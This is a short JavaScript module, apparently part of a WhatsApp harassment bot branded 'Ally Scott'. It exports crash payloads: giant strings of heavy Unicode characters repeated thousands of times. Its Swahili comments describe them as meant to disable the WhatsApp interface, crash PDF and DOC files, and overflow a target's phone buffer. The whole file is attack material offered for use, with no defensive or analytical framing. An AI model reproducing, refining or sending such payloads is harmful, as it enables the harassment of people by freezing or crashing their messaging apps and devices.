/**
 * ALLY SCOTT V11 - ALIEN SYSTEM
 * Dark Arsenal Payloads
 */

const payloads = {
    // Nguvu ya kutosha kulemaza WhatsApp UI kirahisi
    crashPayload: (function() {
        let str = "☣️ ALLY SCOTT CRASH ☣️\n";
        // Kutumia mchanganyiko wa Unicode characters nzito
        let heavy = "҈".repeat(400) + "⡈".repeat(400) + "ᚙ".repeat(400) + "𝀛".repeat(400);
        for (let i = 0; i < 40; i++) {
            str += heavy + "\n";
        }
        return str;
    })(),

    // Payload maalum kwa ajili ya Document crashes (PDF/DOC)
    docPayload: "📂 SYSTEM OVERLOAD 📂".repeat(5000),

    // Inatumika kulemaza buffer ya simu za target
    overflow: Buffer.alloc(1024 * 5, '👾').toString()
};

module.exports = payloads;
